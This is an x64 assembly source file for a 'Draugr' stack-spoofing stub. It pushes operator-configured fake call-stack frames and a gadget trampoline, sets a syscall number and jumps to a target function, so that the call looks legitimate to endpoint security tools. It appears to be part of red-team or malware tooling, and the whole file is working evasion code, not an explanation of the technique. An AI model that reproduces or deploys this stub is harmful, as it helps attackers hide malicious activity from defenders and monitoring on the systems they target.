[BITS 64]

DEFAULT REL

GLOBAL draugr_stub

;
; Draugr stack spoofing stub - N-frame configurable version.
;
; Builds N synthetic call stack frames (defined by operator in spoof_profiles.h)
; plus a gadget trampoline frame. Supports up to SPOOF_MAX_FRAMES (10).
;
; Input: standard x64 calling convention with DRAUGR_PARAMETERS* at [rsp+32].
;
; DRAUGR_PARAMETERS layout:
;   +0x00 Fixup
;   +0x08 OriginalReturnAddress
;   +0x10 Rbx
;   +0x18 Rdi
;   +0x20 Ssn
;   +0x28 Trampoline (gadget address)
;   +0x30 TrampolineStackSize
;   +0x38 FrameCount
;   +0x40 TotalFrameStackSize
;   +0x48 Rsi
;   +0x50 R12
;   +0x58 R13
;   +0x60 R14
;   +0x68 R15
;   +0x70 Frames[0].StackSize      ; each frame = 16 bytes
;   +0x78 Frames[0].ReturnAddress
;   +0x80 Frames[1].StackSize
;   +0x88 Frames[1].ReturnAddress
;   ...
;

[SECTION .text$B]

    draugr_stub:
        pop rax                     ; real return address

        mov r10, rdi                ; save original rdi
        mov r11, rsi                ; save original rsi

        mov rdi, [rsp + 32]         ; rdi = DRAUGR_PARAMETERS*
        mov rsi, [rsp + 40]         ; rsi = target function pointer

        ; store original registers into params struct
        mov [rdi + 0x18], r10       ; Rdi
        mov [rdi + 0x48], r11       ; Rsi
        mov [rdi + 0x50], r12       ; R12
        mov [rdi + 0x58], r13       ; R13
        mov [rdi + 0x60], r14       ; R14
        mov [rdi + 0x68], r15       ; R15

        mov r12, rax                ; r12 = real return address

        ; calculate total offset for stack arg placement
        xor r11, r11                ; arg counter
        mov r13, [rsp + 0x30]       ; total stack args to move

        mov r14, 0x200              ; base working space
        add r14, 8                  ; terminator
        add r14, [rdi + 0x40]       ; + TotalFrameStackSize (all user frames)
        add r14, [rdi + 0x30]       ; + TrampolineStackSize
        sub r14, 0x20               ; adjust for first stack arg position

        mov r10, rsp
        add r10, 0x30               ; offset to stack args source

    .looping:
        xor r15, r15
        cmp r11d, r13d
        je .finish

        sub r14, 8
        mov r15, rsp
        sub r15, r14

        add r10, 8
        push qword [r10]
        pop qword [r15]

        add r11, 1
        jmp .looping

    .finish:
        ; allocate 512-byte working space
        sub rsp, 0x200

        ; stack terminator - ends the call chain walk
        push 0

        ; ── Build user frames bottom-up (last frame first) ──
        mov r13, [rdi + 0x38]       ; r13 = FrameCount
        lea r14, [rdi + 0x70]       ; r14 = &Frames[0]

    .build_frames:
        test r13, r13
        jz .build_trampoline
        dec r13

        ; index = r13 * 16
        mov r15, r13
        shl r15, 4

        ; sub rsp, Frames[r13].StackSize
        sub rsp, [r14 + r15]
        ; mov [rsp], Frames[r13].ReturnAddress
        mov r11, [r14 + r15 + 8]
        mov [rsp], r11

        jmp .build_frames

    .build_trampoline:
        ; gadget trampoline frame (always present)
        sub rsp, [rdi + 0x30]
        mov r11, [rdi + 0x28]
        mov [rsp], r11

        ; set up fixup routing
        mov r11, rsi                ; r11 = target function
        mov [rdi + 0x08], r12       ; store real return address
        mov [rdi + 0x10], rbx       ; store original rbx
        lea rbx, [rel .fixup]       ; rbx → fixup routine
        mov [rdi], rbx              ; Fixup member = fixup address
        mov rbx, rdi                ; rbx = params struct (JMP [RBX] target)

        ; syscall setup (no-op if ssn == 0)
        mov r10, rcx
        mov rax, [rdi + 0x20]       ; SSN

        ; transfer to target function
        jmp r11

    .fixup:
        ; target returned - restore everything
        mov rcx, rbx
        add rsp, 0x200              ; working space
        add rsp, [rbx + 0x30]       ; trampoline frame
        add rsp, [rbx + 0x40]       ; TotalFrameStackSize (all user frames)

        ; restore original registers
        mov rbx, [rcx + 0x10]
        mov rdi, [rcx + 0x18]
        mov rsi, [rcx + 0x48]
        mov r12, [rcx + 0x50]
        mov r13, [rcx + 0x58]
        mov r14, [rcx + 0x60]
        mov r15, [rcx + 0x68]

        push rax
        xor rax, rax
        pop rax

        jmp QWORD [rcx + 0x08]     ; return to real caller
